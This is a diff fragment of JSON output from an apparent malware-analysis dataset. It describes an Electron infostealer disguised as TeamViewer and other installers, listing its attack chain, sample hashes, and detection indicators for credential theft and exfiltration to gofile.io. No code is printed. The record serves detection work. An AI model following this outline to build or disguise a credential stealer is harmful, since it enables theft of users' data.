+                  "similar_legitimate_use": "Some legitimate diagnostic or support tools may collect system information for troubleshooting, but they do not access browser credentials or upload sensitive data to anonymous file-sharing services.",
+                  "key_indicators": [
+                    "Access to browser data and credential stores via Node.js APIs",
+                    "Collection of system information using Node.js modules (e.g., os, fs)",
+                    "Network exfiltration to gofile.io or similar file-sharing domains",
+                    "Malicious logic embedded in Electron app's asar archive (e.g., a.js)",
+                    "Absence of user notification or consent for data collection and exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, after installation and on app launch",
+                  "file_location": "app\\resources\\app.asar > a.js (Node.js script inside Electron app bundle)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (Electron-based infostealer variants)",
+                  "package_manager": "NSIS installer (Electron app bundle)",
+                  "package_versions": "Unknown (malicious samples: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e)",
+                  "why_malicious": "The entire package is malicious because it masquerades as legitimate software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe), but actually installs and executes an Electron-based infostealer. The malware leverages Node.js capabilities within the Electron framework to harvest sensitive data such as system information, browser histories, and credentials, and exfiltrates this data to external file-sharing services like gofile.io. The use of NSIS installers and Electron's asar archive structure is intended to evade detection and facilitate stealthy data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and runs the NSIS installer masquerading as legitimate software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe).",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Installation and execution of the bundled Electron app."
+                  },
+                  {
+                    "step": 2,
+                    "action": "NSIS installer executes the Electron app, which loads the malicious Node.js code from the asar archive.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code execution within the Electron app context."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious Node.js code collects sensitive data (system information, browser histories, credentials) from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of harvested data for exfiltration."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to the gofile file-sharing service via network requests.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen data, achieving the final objective of data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Electron app accessing browser data and credentials via Node.js APIs shortly after installation or first run",
+                    "Network connections to file-sharing services (e.g., gofile.io) initiated by Electron-based applications",
+                    "Electron apps bundled in NSIS installers that immediately execute the main app post-installation",
+                    "Absence of user notification or consent for data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.asar archive containing suspicious Node.js scripts (e.g., a.js) within Electron app resources",
+                    "NSIS installer files with names mimicking popular software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe)",
+                    "Electron app bundles with embedded scripts referencing credential or browser data APIs"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to gofile.io or similar file-sharing domains from Electron app processes",
+                    "Unusual POST requests containing system, browser, or credential data to external file-sharing services",
+                    "Network activity from newly installed Electron apps to non-standard domains immediately after installation"
+                  ],
+                  "how_to_detect": "Monitor for Electron-based applications that, upon installation or first run, access browser credential stores, system information, or user data, and then initiate outbound connections to file-sharing or data exfiltration services such as gofile.io. Inspect Electron app asar archives for Node.js scripts that reference credential or browser data APIs. Flag NSIS installers that immediately execute bundled Electron apps, especially if the app is not from a verified publisher or is distributed outside official channels. Correlate file, process, and network activity to identify infostealer behavior patterns."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/MidiImport.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
